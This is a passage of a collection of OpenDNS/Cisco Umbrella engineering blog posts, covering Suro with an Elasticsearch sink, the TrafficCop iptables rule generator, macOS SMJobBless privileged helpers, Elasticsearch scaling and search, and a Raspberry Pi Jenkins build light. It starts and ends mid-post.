1. Type: specifies the type of sink 2. Cluster.name: name of Elasticsearch cluster 3. AddressList: the IP addresses of Elasticsearch nodes to communicate with 4. IndexInfo: this encapsulates the required information Elasticsearch needs to index the given messages. Elasticsearch assumes messages are in JSON format. 5. Timestamp (required): – specify the timestamp field of your JSON message – in this example, the timestamp field is “ts” 6. IndexTypeMap (required): – specifies which index and type to store the message in with the given routing key – Field values: – esKey: the routing key used to route messages to this sink – index: the index name – type: the index type – for this tutorial, I chose to name the index “index” and type “type” Other parameters: 7. clientName: arbitrary Elasticsearch client name 8. batchSize, batchTimeout, corePoolSize, maxPoolSize, jobQueueSize, queue4Sink: configurable settings for performance. For more information about these parameters, click here . Adding the ElasticSearchSink configuration settings to the sink.json file should look like the code block below. Now we have two sinks: default (LocalFileSink) and esSink (ElasticSearchSink). {\n     \"default\": {\n        \"type\": \"local\",\n        \"outputDir\": \"/tmp/suroserver/demo\",\n        \"minPercentFreeDisk\": 10,\n        \"writer\": {\n               \"type\": \"text\"\n        }\n     },\n     \"esSink\": {\n        \"type\": \"elasticsearch\"\n        \"clientName\": \"test-client\",\n        \"addressList\": [\n               \"127.0.0.1:9300\"\n        ],\n        \"indexInfo\": {\n               \"timestamp\": {\n                     \"field\": \"ts\"\n               },\n               \"indexTypeMap\": {\"esKey\":\"index:type\"},\n               \"type\": \"default\"\n        },\n        \"batchSize\": 2500,\n        \"batchTimeout\": 10000,\n        \"cluster.name\": \"elasticsearch\",\n        \"corePoolSize\": 4,\n        \"maxPoolSize\": 4,\n        \"jobQueueSize\": 0,\n        \"queue4Sink\": {\n               \"capacity\": 1000000,\n               \"type\": \"memory\"\n        }\n     }\n} Modify Suro Client: In DemoSuroClient.java: Add code to send a basic JSON message to the ElasticSearchSink and LocalFileSink The JSON message has two fields: ts: the timestamp field that holds the current time (UTC) in milliseconds f1: arbitrary field with arbitrary value “v1” import java.util.Map;\nimport java.util.Properties; import com.netflix.suro.ClientConfig;\nimport com.netflix.suro.client.SuroClient;\nimport com.netflix.suro.message.Message;\nimport com.fasterxml.jackson.core.JsonProcessingException;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.netflix.suro.jackson.DefaultObjectMapper;\nimport com.google.common.collect.ImmutableMap; public class DemoSuroClient {\n     public static void main(String[] args) throws JsonProcessingException {\n        final Properties clientProperties = new Properties();                        clientProperties.setProperty(ClientConfig.LB_TYPE, \"static\");\n        clientProperties.setProperty(ClientConfig.LB_SERVER,\n\"localhost:7101\");\n        ObjectMapper jsonMapper = new DefaultObjectMapper();\n        SuroClient client = new SuroClient(clientProperties);\n        Map<String, Object> msg = new ImmutableMap.Builder<String, Object>()\n                             .put(\"ts\", System.currentTimeMillis())\n                             .put(\"f1\", \"v1\")\n                             .build();\n        client.send(new Message(\"routingKey\",\njsonMapper.writeValueAsBytes(msg)));\n        client.send(new Message(\"esKey\", jsonMapper.writeValueAsBytes(msg)));\n        client.shutdown();\n     }\n} Running/Testing Suro (LocalFileSink and ElasticSearchSink) Round two! Make sure Elasticsearch is running. (If not, follow the Installation steps here .) Run Suro Server: cd to the suro/suro-server directory and enter: java -cp \"build/install/suro-server/lib/*\" com.netflix.suro.SuroServer -m conf/routingmap.json -s conf/sink.json -i conf/input.json Run the Suro Client. Verify messages were sent to the server. Go to http://localhost:7103/surosinkstat. You should see: default:1 msgs, 30 bytes written, 0 have empty routing key. 0 failures of closing files\nesSink:indexed: 1, rejected: 0, parsing failed: 0 Stop running client and server. Verify messages were received by the LocalFileSink: cd /tmp/suroserver/demo cat *.done *=arbitrary file name Suro generates for this file File should be different than the one outputted in part 1 of the tutorial “ts” will be different since it is the current time You should see: {\"ts\":1427841866680,\"f1\":\"v1\"} Verify messages were received by the ElasticSearchSink (curl ‘localhost:9200/_cat/indices?v’). You should see: health status index pri rep docs.count docs.deleted store.size pri.store.size\ngreen  open   index   1   1          1            0      2.7kb          2.7kb Now search the index (curl -XGET ‘http://localhost:9200/index/_search?pretty’). The “_id” and “ts” will be different. You should see: {\n   \"took\" : 1\n   \"timed_out\" : false,\n   \"_shards\" : {\n      \"total\" : 1,\n      \"successful\" : 1,\n      \"failed\" : 0\n   },\n   \"hits\" : {\n      \"total\" : 1,\n      \"max_score\" : 1.0,\n      \"hits\" : [ {\n      \"_index\" : \"index\",\n      \"_type\" : \"type\",\n      \"_id\": \"AUxyCAKYW6d2U9MFnCYn\",\n      \"_score\" : 1.0,\n      \"_source\":{\"ts\":1427842261844,\"f1\":\"v1\"}\n      } ]\n   }\n} We now have successfully added an ElasticSearchSink to our Suro setup. Taking a look at the above output from Elasticsearch, we can see that the document has index name “index” and type name “type” as specified in our ElasticSearchSink configuration settings. The ID field is auto-generated but can be set to a field in the document (see idFields section on this page ). The source field matches the output returned by the LocalFileSink, so we have demonstrated it is possible to take a single input and route that information to multiple data sources. Conclusion: At OpenDNS, we are still experimenting with Suro; trying to find the best way to configure it to fit our needs. So far it looks promising. We believe Suro is capable of providing a scalable solution for routing data across multiple platforms without sacrificing performance. However, documentation of other users’ experiences and simple use-case examples are lacking online. We hope that our tutorial will help others save time trying to figure out how to use Suro and jump right into using it to solve big data needs. For more information, you can visit Netflix’s Suro wiki page and Netflix’s own blog post debuting Suro.", "date": "2015-04-28"},
{"website": "Cisco-Umbrella", "title": "Generating Iptables Rules With TrafficCop", "author": ["Chris Dorros"], "link": "https://umbrella.cisco.com/blog/generating-iptables-rules-with-trafficcop", "abstract": "Today the OpenDNS engineering team is releasing Traffic Cop, a simple, open source tool to uncover to where your host is communicating, and help you write iptables rules. In a nutshell, it does three things: Configures and enables logging of all inbound and outbound connection attempts (by default it looks for TCP SYN packets). Generates a report showing the IPs and services of the peers the host is communicating with. Generates iptables rules for each connection type. Motivation Let’s start with a quick example: You have a fresh host for your new project and want to “lock it down.” You know it needs to talk to your database server and a few backend services, and that it will need inbound access from admins over SSH, plus web access for your clients. Writing the rules is not very easy either, but there are a few good tools out there for helping with that. You finalize your ruleset and put them in place. Everything works good for a few days, until your users can’t login because you forgot to enable access to your NTP (time) server, and the auth components need to stay in sync with time! This is just one simple example, but the big picture is that in today’s fast-paced development world, where we’re building widgets using libraries built on top of other libraries, we don’t always know what our dependency chains looks like. This can make allow lists for security difficult, and sometimes a bit scary, as we want to do the right thing but not break anything. How TrafficCop Helps Let’s redo our example. This time we configure Traffic cop to log all connections on our server in a development/test environment (you probably don’t want to experiment in production). We let it run for a few days to get a good sense of the traffic. At the end of the learning phase, we’ve captured a rough baseline for the host. We review the rules it generated, select the ones that make sense, tweak the IP ranges as we see fit, and put them in place. Note that we’re not just talking about inbound firewall rules here. We’re putting outbound rules in place too. This is traditionally an uncommon practice on host-based firewalls, as outbound traffic is typically more painful to classify and understand per application, but we’re using live data to drive the configuration, therefore we can take advantage of outbound traffic filtering. A blanket allowance of outbound traffic is one of the big drivers for malware to be primarily outbound focused (connecting back to “the mothership”), rather than attempting to communicate with the target inbound. Demo Time! We spin up a fresh EC2 instance, in a public subnet, using the default security groups (allows port 22 inbound from anywhere and all outbound). SSH into the instance: $ ./tcop enable $ curl google.com (to show outbound log) (waited about 5 minutes) $ ./tcop report That first inbound IP is us logging into the instance. The others are not! Notice that within just a few minutes we’re already getting IPs from around the world hitting our SSH port. Great, How do I get Started? Head over to the GitHub page for instructions on setting it up and generating reports. Contributions definitely welcome! Feel free to fork & feature requests! Hope you find it useful.", "date": "2015-08-31"},
{"website": "Cisco-Umbrella", "title": "Sandboxing with Privilege: Mobile App Development for the PC World", "author": ["Erik Peterson"], "link": "https://umbrella.cisco.com/blog/sandboxing-with-privilege-mobile-app-development-for-the-pc-world", "abstract": "Architecting applications for personal computers is getting to a technical level similar to that of smartphones, and that requires changes in how applications are signed and deployed. For mobile app developers, distributing apps via the App Store has been a game-changing solution to problems like monetization, marketing, distribution, and update management. Both the Windows and Mac app stores now require apps to be cryptographically signed, and they follow certain sandboxing rules for security. iOS and Android apps are highly restricted when it comes to interacting with the system and other apps, and for good reason. Locking down environments at the app level–often called sandboxing – is designed to protect the OS and other apps from malevolence. Each app on iOS has its own self-contained, bundled file system that is separate from the OS and other installed apps. Sandboxing also requires executables to be signed with a valid developer certificate, making them more tamper proof. The “Sandboxed World” is coming. Let’s explore some of the implications and alternatives to current best practices. What does this mean for PC developers? Both Apple and Microsoft offer app stores for their PC platforms, and running in a sandboxed mode is optional–for now. For mobile developers targeting iOS and Android, sandboxing is mandatory. This is because sandboxing apps is safer, so developers who choose not to embrace sandboxing may find they lose users, depending on the security configuration of their PCs. On a Mac, for example, navigating to System Preferences / Security & Privacy / General, a user can find options about which apps to trust. Is the executable signed?  If so, is it signed by a developer who is in the trust chain of the platform provider? Has the app been vetted by the App Store? On Windows 8, users see “Windows Store Apps” (formerly Metro Apps), which similarly are very well sandboxed and signed. Apps can also be restricted by what types of privileges they require, giving the user ultimate granular control of what types of apps can do which functions. Implications of Sandboxing for Developers Developing a sandbox app requires a shift in traditional PC approaches. An example of the shift in application life cycle that comes to mind is the waning need for installers. Since, on OSX for example, all application files are self-contained, the entire bundle can be dropped into the Applications folder or just deleted. The footprint is then cleaner as well, leaving no extraneous files that could be manipulated outside control of the app. One might ask: “if installers are no longer necessary, then how will I ask the user for escalated privileges?” There is a legitimate set of software which does need to run with escalated privileges, if the software needs to listen on a low port number, for example. It’s not uncommon to come across mobile apps that require more privileges beyond those available to standard developers. Let’s look at Junos Pulse for iOS as an example. Pulse implements its own SSL VPN–separate from the native iOS system VPN. When first developing Pulse, Juniper needed special approval and joined Apple’s undocumented VPN API. A handful of other developers are doing this as well. In a sandboxed world, the platform providers hold the keys to special app privileges. On a PC, a sandboxed app may also ask the user for special permission using an API, but it is the user who authenticates the app (usually type in an admin password). Let’s take a look at a few of these APIs on Mac OS X. Mac OSX APIs for Escalating Privilege API: SMJobBless The preferred method of managing privilege escalation on Mac OS X. There are many other APIs in the framework that must be used in conjunction with SMJobBless. API: AuthorizationExecuteWithPrivileges This API is deprecated. Once used, setuid() can be used to make the process a root process. API: do shell script “ scriptname ” with administrator privileges This is an AppleScript mechanism to run a shell script with administrator privileges. The new preferred paradigm stays in line with the “ Principle of least privilege .”  Instead of forcing the whole app to run with elevated privilege, “helpers” can do the privileged operations. Because the operation is short-lived, it is less likely that it could be exploited. Let’s take a look at the SMJobBless way of doing things while achieving the following goals of: Preserving the ability to drag-install the application. Operating under the principle of least privilege by isolating privileged code in a separate process instead of having the entire application running with elevated privileges. Avoiding the use of setuid binaries. Requiring the user to authorize the privileged helper tool only the first time it’s used. Ensuring that the tool hasn’t been replaced by another potentially malicious tool. Ensuring that the tool hasn’t been co-opted by a different potentially malicious application. * (From SMJobBless project Readme.txt https://developer.apple.com/library/mac/samplecode/SMJobBless/Introduction/Intro.html) Within this project we have the actual app and we have the helper.  The helper has two corresponding plist files which would be used by launchd for execution and the traditional Info.plist. <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n    <dict>\n        <key>Label</key>\n        <string>com.apple.bsd.SMJobBlessHelper</string>\n    </dict>\n</plist> The label here “com.apple.bsd.SMJobBlessHelper” will be important later.  Consider the code below (from the project) - (BOOL)blessHelperWithLabel:(NSString *)label error:(NSError **)errorPtr;\n{\n    BOOL result = NO;\n    NSError * error = nil;\n    AuthorizationItem authItem = { kSMRightBlessPrivilegedHelper, 0, NULL, 0 };\n    AuthorizationRights authRights = { 1, &authItem };\n    AuthorizationFlags flags = kAuthorizationFlagDefaults |\n    kAuthorizationFlagInteractionAllowed |\n    kAuthorizationFlagPreAuthorize |\n    kAuthorizationFlagExtendRights;\n    /* Obtain the right to install our privileged helper tool (kSMRightBlessPrivilegedHelper). */\n    OSStatus status = AuthorizationCopyRights(self->_authRef, &authRights, kAuthorizationEmptyEnvironment, flags, NULL);\n    if (status != errAuthorizationSuccess) {\n        error = [NSError errorWithDomain:NSOSStatusErrorDomain code:status userInfo:nil];\n    } else {\n        CFErrorRef  cfError;\n    /* This does all the work of verifying the helper tool against the application\n    * and vice-versa. Once verification has passed, the embedded launchd.plist\n    * is extracted and placed in /Library/LaunchDaemons and then loaded. The\n    * executable is placed in /Library/PrivilegedHelperTools.\n    */\n    result = (BOOL) SMJobBless(kSMDomainSystemLaunchd, (CFStringRef)label, self->_authRef, &cfError);\n    if (!result) {\n        error = CFBridgingRelease(cfError);\n    }\n}\nif ( ! result && (errorPtr != NULL) ) {\n    assert(error != nil);\n    *errorPtr = error;\n}\nreturn result; The label passed in here is the string from the plist above.  The _ authRef member is created earlier upon launching when creating the “AuthorizationRef” object: OSStatus status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &self->_authRef); This object describes the types of rights and behaviors we wish to bestow upon the helper. Decisions to request authorization from the user, if it can be pre-authorized etc can be set here. HINT : There are notes about the flags in the Authorization.h Once you have your AuthorizationRef object set up, it’s now time to call SMJobBless() and the helper will get called automatically by launchd after the launchd plist is placed under Library/LaunchDaemons. In order for this to work both must be signed with an appropriate developer certificate obtained from developer.apple.com . It’s a Mad Mobile World The vast majority of app developers should not need to worry about such maneuvers. But those who do can enjoy the best of both worlds—sandboxing and privilege. Historically, software vendors needing even tighter OS integration—when installing a kernel module for example—would need platform vendor certification. The platform vendors often have formal third-party programs for this type of integration. It’s a sure bet that, moving forward, PC app development will become more restrictive to mitigate the increasing threat of malware.", "date": "2015-03-24"},
{"website": "Cisco-Umbrella", "title": "Instructions for faster DNS on your mobile", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/instructions-for-faster-dns-on-your-mobile", "abstract": "Phones, PDAs, and every other mobile device smaller than a laptop and bigger than an iPod Shuffle needs DNS for web browsing, among other things. With speedier networks, the mobile web is getting more and more useful… and speedy DNS makes the experience better . Frankly, I had forgotten this obvious use of OpenDNS, until we started seeing our users comment on websites devoted to mobile devices. Thanks for the reminder! Change your mobile to OpenDNS Today, we added instructions about how to change DNS on your mobile device, with our first entries covering Windows Mobile and Palm OS 5 (Treo). Help us provide more details Mobile devices are even more numerous and diverse than routers, so I’d love your help in two areas. First : let us know which other devices most need instructions for changing to OpenDNS. Please include carriers and countries, if informative. Second : if you’d like to write instructions to share your personal knowledge, I’d welcome the assistance. Send instructions and/or screenshots to our contact email address or link to instructions in the comments here. Note: I’m still working out how I might expense a Sony PSP so I can write up instructions about how to use OpenDNS on this (ahem) “productivity” device.", "date": "2006-09-05"},
{"website": "Cisco-Umbrella", "title": "Elasticsearch: You Know, For Logs [Part 2]", "author": ["OpenDNS Engineering"], "link": "https://umbrella.cisco.com/blog/elasticsearch-you-know-for-logs-part-2", "abstract": "Part 2: Scalability and Availability In Part 1 of this series, Elasticsearch proved that it could be configured to consume log data by using Index Templates and an time schema based on time frames. In order to move forwards with Elasticsearch it also needs to be easily scalable while maintaining high availability. This post will first explore three different node roles and how to use them scale an Elasticsearch cluster while maintaining a balanced workload. Moving forwards, this post will talk about a few different failure cases and how to protect a cluster from them. Scalability Scaling horizontally with Elasticsearch is as straightforward as it gets. Adding more nodes to an Elasticsearch cluster is as simple as firing up a new Elasticsearch instance with the cluster name in the Elasticsearch config(elasticsearch.yml) file to match the rest of the cluster. When the new node comes online it will be automatically discovered by the cluster and get to work right away. As a cluster grows, three different types of nodes can to be added. Part of maintaining a stable cluster is making sure that there are the right number of nodes performing each role. Data Nodes Data nodes are the workhorses of the cluster. They are responsible for indexing documents and performing searches as well as other index operations. Adding data nodes is the best way to scale up an Elasticsearch cluster if indexing and/or search performance needs to be improved. A data node has the following configurations: node.master: false node.data: true Adding these setting ensures data nodes will focus solely on their jobs of searching and indexing without running the risk of taking on the responsibilities of a master node. Master Node As an Elasticsearch cluster gets larger the cluster state becomes more cumbersome to maintain. This means your master node will be doing more work as you scale so it becomes more important to have a dedicated master node with at least one backup master node in the case of a failure. For large clusters it is recommended to have a total of three dedicated master nodes, of which one will be the master and two will be backups. A dedicated master node is a node with the following configurations: node.master: true node.data: false These settings prevent the node from storing data thus enabling it to focus solely on its job as a master node. Load Balancer Node Additionally, if an Elasticsearch cluster is receiving a high volume of index or search requests, adding some load balancing nodes can take some of the stress off the data nodes in the cluster. A load balancer node is not a master node and it also does not store any data. Its sole responsibility is to handle all HTTP communication. A load balance node has the following configurations: node.master: false node.data: false Load balancer nodes take pressure off of data nodes by routing search and index requests to the relevant nodes. This prevent requests from being bounced between data and/or master nodes. Additionally load balancer nodes perform all of the “Scatter and Gather” operations of a search request, allowing data nodes to focus on their primary functions. Maintaining a Balanced Cluster As a cluster grows, the number of shards will need to grow with it to ensure the workload is properly balanced among the cluster. If the number of data nodes grows beyond the number of shards, then some nodes will not be used. Alternatively, if the number of nodes is not a multiple of the number of shards, then the cluster will not be evenly balanced. One way to balance a cluster is by attempting to maintain a static number of shards per node. This setting is configured and can be updated in the index template. For example, to maintain a cluster with two shards per node, the following template could be used: curl -XPUT localhost:9200/_template/template_1 -d '\n{\n    \"template\" : \"syslog-*\",\n    \"settings\" : { \"number_of_shards\" : <Number of data nodes>\n       \"number_of_replicas\": 1 },\n    \"mappings\" : {\n        \"log\" : {\n            \"properties\" : {\n                  \"Timestamp\" : {\"type\" : \"date\",\n                               \"fielddata\": {\n                                    \"loading\" : \"eager\"\n                                    }\n                             },\n                  \"URL\" : {\"type\" : \"string\",\n                             \"index\": \"not_analyzed\"},\n                  \"IP Address\" : {\"type\": \"ip\"}\n            }\n        }\n    }\n}\n' Sending this request will simply update the template with the new number of shards, but will only be applied to new indices. Once an index is created, the number of primary shards cannot be changed. We can however, balance older indices by increasing the number of replicas per shard using the following request: curl -XPUT 'localhost:9200/dns-test-1/_settings' -d '\n{\n     \"index\" : {\n     \"number_of_replicas\" : 1\n     }\n}' For example the graphic below shows a two-data node cluster with a balanced index: With two primary shards per index, each with one replica, the workload will be evenly balanced between the data nodes. Then, adding a new node, the shards will be rebalanced automatically: With three data nodes but only two primary shards per index, the workload is no longer evenly balanced. “Blind Faith” could receive double the traffic of “Jocasta” or “Stanley Stewart”. Now update the template, setting “number_of_shards” to three, up from two, so new indices will be balanced evenly: Finally, increase the number of replicas of the old index to rebalance it: This last step may not always be necessary as it will significantly increase the storage requirement of the index, especially if rebalancing the index requires adding more than one additional replica. Availability With three different types of nodes, maintaining high availability means handling three different failure cases. Data Node Failure The most common case is the failure of a data node. In the case of a data node failure, Elasticsearch will automatically rebalance each index by creating a new copy of each failed shard using its replicas. In the time between when a node fails and the failed shards are replicated, the cluster will enter the “yellow” cluster state. This means data loss is possible if another node fails during this window. Furthermore, no node can store more than one replica of the same shard, so it is possible extra replicas will not be reassigned after a failure. They will simply wait until the failed node comes back online. For example: Node “Flash Thompson” Fails: Cluster Health is now “Yellow” due to shards ‘0’ and ‘2’ in “dns-test-2” being replicated. Once they are finished, there will be unassigned shards in “dns-test-1” still but every shard will have a stable replica: Cluster Health is still “Yellow” due to unassigned shards in “dns-test-1,” but the cluster is stable as every shard has at least 1 replica. Now bring the node back online and the cluster will return to normal: Master Node Failure Another case is the failure of a master node. In this case, having a backup master node is essential since otherwise a data node will be elected as the master. A data node might not be able to handle the added responsibility of maintaining the cluster state which could result in all kinds of badness. Otherwise, if a master node fails a backup will simply be elected master and the cluster state should be maintained. For example: “Margo Damian” is currently the master node, but “Warstar” is ready and waiting in case of a failure. Then if the master node does fail: “Warstar” is automatically elected as master and the cluster state is maintained. Furthermore, it is important to maintain the right number of minimum master nodes in Elasticsearch to prevent the “Brain Split” problem where two master nodes are elected within the same cluster. To do this, maintain the discovery.zen.minimum_master_nodes setting at a quorum of eligible master nodes in the cluster. For example, for a cluster with three eligible master nodes, the minimum master nodes should be set to two in Elasticsearch’s configuration. discovery.zen.minimum_master_nodes: 2 Read more about the Brain Split problem here . Load Balancer Node Failure Unfortunately, failure of a load balancer node cannot be automatically dealt with by Elasticsearch. Any requests sent to the failed node will return an error message that must be handled on the client side. If any node that is receiving index or search requests fails, the following exception will be thrown: org.elasticsearch.client.transport.NoNodeAvailableException: None of the configured nodes are available: [] Having multiple load balancer nodes should allow the client to handle this exception and redirect the request to an available node. Conclusion In this second part of our series, Elasticsearch has shown that it can be scaled and balanced with relative ease. Additionally, Elasticsearch can maintain a highly available cluster by assigning specific roles to each nodes and having available backups. In the next post in our series on Elasticsearch we will look into optimizing searching and sorting for log data. Continue to: Elasticsearch: You Know, For Logs [Part 3] .", "date": "2015-05-07"},
{"website": "Cisco-Umbrella", "title": "Build a Programmable LED for Jenkins CI", "author": ["Michael Merritt"], "link": "https://umbrella.cisco.com/blog/build-a-programmable-led-for-jenkins-ci", "abstract": "For our latest OpenDNS hackathon, I decided it would be a fun exercise to use an individually addressable digital LED strip to create a build light for our Jenkins instance. We work in a continuous development environment, and the light gives a quick heads-up display to see if it’s safe to merge. Plus, LEDs are just plain fun! I followed this Adafruit article but used a Raspberry Pi 2 instead of Pi 1. The Pi 2 has more available pins, but the connecting pins will be the same. For power, I opted for a 5V/10Amp switching PSU, which provides more than double what my two-meter strip needed. If you have some basic knowledge of Python, Linux, and soldering you should have no problem completing this in a few hours. If you’re anything like me, you’ll spend the majority of your time playing with different lighting patterns. Hardware used Digital RGB LED strip – LPD8806 5V/10A switching power supply (must be 5v) JST 4-pin inline cables (plug and receptacle) DC power jack Female jumper wires (or ribbon cable) Raspberry Pi 2 (or 1) SDCard (Raspberry Pi boots off the SDCard) Soldering iron*, solder, and wire strippers Optional Raspberry Pi case *You can get away with not soldering if you buy appropriate connectors to hold wires in the place. I also tried the ribbon cable used in the Adafruit tutorial and it provided a very tight connection. Let’s wire it up! Raspberry Pi 2 Pin-out diagram Connect power Connect +5V and GND from the power supply to the +5V and GND pins on both the LED strip and the Raspberry Pi2 GPIO header. I simply soldered two wires into the positive jack and then two into the ground jack of the DC adapter. That way I could power both the Raspberry Pi and the LED strip off the same PSU. Note: Do not attempt to power the LEDs off a micro USB cable connected to the Pi. Connect the LED strip The board’s SPI_MOSI pin connects to the DI input on the LED strip, and SPI_CLK pin connects to the CI input on the LED strip. Be aware of polarity I lucked out and Adafruit shipped my LEDs with a female JST 4-pin inline cable attached to the inputs of the LEDs. But Adafruit’s website says this is not always the case, and you might find your JST cable connected to the LED outputs! So be aware of which end you’re connecting to on the LED strip. If you look closely at your LED solder points you can see DI and CI for input, while DO and CO are your outputs respectively. Once everything is connected it’s time to plug in the PSU. OK, now I’ve got random LEDs lit Initially, when I connected my LED strip there were no lights or random lights turning on until I ran my python script instructing the LEDs. Whew! But this could also be a sign that you’re not providing enough amperage to your LEDs. Adafruit has some troubleshooting tips to read over. If you’re using more than enough power then lets ignore the random LEDs and let’s move on. Raspberry Pi setup Rasberry Pi’s own site has very good instructions on how to do the following: Install an OS to Raspberry’s SDCard (I used NOOBS with Raspbian) Find the Raspberry’s IP address Be able to SSH to the device Enable SPI (serial port interface bus) Software dependencies Here’s some of the software dependencies and updates that helped me. I used python 2.7.3 for this project, which was preinstalled on the Pi. I recommend using virtualenv to install your python dependencies. It’s a good habit to get into and keeps things tidy. You need to first ssh pi@ipaddress and install these from the command line of the Pi. Most of these will require sudo . $ sudo apt-get update\n$ sudo apt-get upgrade\n$ sudo apt-get install python-pip\n$ sudo apt-get install python-dev\n$ sudo apt-get install git Install Bibliopixel for LED bliss Download and install the latest from github $ git clone git@github.com:ManiacalLabs/BiblioPixel.git\n$ cd BiblioPixel\n$ sudo python setup.py install\n$ sudo pip install -r requirements.txt Reboot once everything is installed $ sudo reboot LED drivers Bibliopixel should’ve included multiple drivers to choose from. We’re using the LPD8806. Once it’s installed (and SPI is enabled) you should see the device in your dev directory on your Pi: $ ls -la /dev/spidev*\ncrw-rw---T 1 root spi 153, 0 Jan  1  1970 /dev/spidev0.0 Now for the fun part, playing with LEDs! I wrote a simple python script that utilizes threads and a queue. Using a queue is one way to communicate between threads with the added bonus that it’s thread safe. The change of color can be thought of as an event and your event pool as a handler. When an event is emitted, the appropriate candidate responds with it’s particular color or animation. The color changes I’m using in my script are very simplistic on/off color changes but Bibliopixel provides some very fun pre-written animations that you might try modifying, for example: Clone the latest copy of the jenkins status light script: $ git clone https://github.com/opendns/jenkins-status-light\n$ cd jenkins_status_light\n$ sudo pip install -r requirements.txt Manually running the script Simply supply the jenkins host and job name as command line arguments to run: $ sudo python jenkins_status_light.py --jenkins-url https://jenkins.example.com --job job-name It’s working! At this point if the script didn’t exit you should see LEDs come up for the current build status of Jenkins and change whenever Jenkins build status change from success, failure or aborted. But if the script did exit, you’ll need to read through your console to see what is failing and address that. Changing colors The colors I selected might not be what you want, but you can easily swap out predefined colors in the global section at the top of my script. Supervisor Once things are working then we should try wrapping our script with Supervisor. This provides us with monitoring and helps keep the script running. If our lighting script exits or crashes for any reason, Supervisor will restart it. As an added bonus, when you plugin the Raspberry Pi, the script will automatically run and the lights come right up! As the root user, run the following command to install the Supervisor package: apt-get install supervisor Let’s add a configuration file to tell Supervisor where our jenkins_status_light.py file is and what to do with it. Save the file at /etc/supervisor/conf.d/jenkins_status_light.conf. [program:jenkins_status_light]\ncommand=/usr/bin/env python /home/pi/jenkins_status_light.py --jenkins-url https://jenkins.server.com --job job-name\nautostart=true\nautorestart=true\nstderr_logfile=/var/log/jenkins_status_light.err.log\nstdout_logfile=/var/log/jenkins_status_light.out.log Once you’ve saved that file then as the root user you can inform Supervisor of our new file: supervisorctl reread Then update with those changes: supervisorctl update To control Supervisor you can use the following commands: sudo service supervisor stop / start / restart To monitor stdout of our py file output: tail -f /var/log/jenkins_status_light.out.log There’s also an interactive mode that is worth reading about. Securing the Pi The Raspberry Pi is a full fledged computer and it’s only as secure as you make it. Here’s a list of some things to do to increase the security of your device: The first thing you should absolutely do is change the default password . You can test the strength of your password with Steve Gibson’s password haystack . The higher the entropy the better. Make sure everything is up to date. We did this with apt-get update and apt-get upgrade above. Enabling unattended security updates which can help avoid “ 0-day exploits ”. Change the default user account to something other than ‘pi’ (Note that root is disabled by default on Raspbian which is great) Close all services and ports you don’t use. Don’t let untrusted people near it. It’s simple to plug a malicious device into it to gain control. Don’t make the Pi publicly available on the internet unless you know what you’re doing. It’s best to sit behind your NAT router with DMZ disabled and behind a firewall if you have one (there’s one built into Linux, but it can be difficult to manage). Consider using IP tables to only allow specific IP addresses or IP ranges to connect to your device. Setup Fail2ban to block suspicious SSH connections who make too many failed attempts attempts against the device. This will provide a 10 minute ban for anyone who has 3 unsuccessful login attempts: $ sudo apt-get install fail2ban Note that some things such as “changing the ssh port” while not bad, will only get you so far. “ Security through obscurity ” won’t do much but slow down a determined hacker. Project improvements Using a queue means lights don’t always update immediately, esp. if build times are very short Daemonizing threads and being able to cleanly exit the script would be great Sometimes the light will quickly flash a past build color before updating to the correct color Have the script automatically determine how many LED strips exist Try creating a moving ‘progress bar’ animation to display estimated build duration. Since this was 24-hour hackathon project I’m sure there are plenty of code improvements to be made. Please feel free to fork and submit changes and improvements! We’d love to see your own projects and what you did with this! Happy hacking!", "date": "2015-05-26"},
{"website": "Cisco-Umbrella", "title": "Elasticsearch: You Know, For Logs [Part 3]", "author": ["OpenDNS Engineering"], "link": "https://umbrella.cisco.com/blog/elasticsearch-you-know-for-logs-part-3", "abstract": "Part 3: Searching and Sorting In Part 2 of this series, Elasticsearch proved that it could be scaled up with relative ease using different instance roles in order to balance the workload. Additionally, Elasticsearch showed that, given proper setup and configuration, it can handle several different failure cases while maintaining high availability. This post will focus on how to optimize searching and sorting in Elasticsearch for log data. Log Search By default, Elasticsearch expects to be querying full text documents, not log data. As a result, Elasticsearch will score and sort each hit based on a relevancy factor since a single document could have more than one occurrence of the search term. This functionality can be avoided when searching log data by using a “‘filtered”’ query. For example, the following query uses a filter that doesn’t score its hits: curl -XGET localhost:9200/_search -d '\n{\n\"size\" : 10,\n  \"query\": { \"filtered\": { \"filter\": { \"term\": { \"URL\": \"opendns.com/enterprise-security\"}\n      }\n    }\n  }\n}\n' This query will return the first 10 documents matching the filter without having to score and sort each document. Sorted Queries Logs often need to be returned in a sorted order. Since documents cannot be stored pre-sorted in Elasticsearch, sorting becomes a fairly challenging problem that can greatly slow down queries. Sorting is achieved in Elasticsearch by adding a “sort” clause to a query. Hits of a sorted query will not be scored. Example: curl -XGET localhost:9200/_search -d '\n{ \"sort\" : [ { \"IP Address\" : {\"order\" : \"asc\"}, \"Timestamp\" : { \"order\" : \"desc\" } } ], \"query\": {\n    \"filtered\": {\n      \"filter\": {\n        \"term\": { \"URL\": \"opendns.com/enterprise-security\"}\n      }\n    }\n  }\n}\n' The query above will return all logs with the URL field “opendns.com/enterprise-security,” sorted in ascending order by IP address. Then any logs with matching IP address fields are sorted in descending order by their timestamp field. Elasticsearch will not score any of the documents matching this query since a different sorting field is given. Without proper configuration, a sorted query could result in a massive increase in response time. This is because no matter the size of your return set, every document that matches the query must be sorted. Even if only the top two documents are asked to be returned, Elasticsearch must sort every document that matches the query to actually determine the top two. This means that a query will have to sort the same number of values regardless of how many documents it actually returns. The default sorting process in Elasticsearch is simple. If Elasticsearch is asked to return the top n hits of a sorted query, it will do the following: First each document that matches the query will be found as a “hit.” Then, for every hit, each shard loads all the data from the field to be sorted into memory. The fields will then be sorted and the top n hits will be returned from each shard. Then, the top hits from each shard will be aggregated and re-sorted to ensure accuracy of the results for each index. Then, the top hit from each index will be aggregated and re-sorted to ensure accuracy of the final results. Finally the top n hits from the cluster are returned. This process is slow and unavoidable, but Elasticsearch has a some options to speed it up. Field Data Elasticsearch stores all the values of the fields to be sorted on in its Field Data Cache. The problem is pulling field data into the cache at the time of the request is a heavy operation since all this data is read from disk. This behavior can be avoided by maintaining a “Field Data Cache.” Fortunately, Elasticsearch allows field data to be 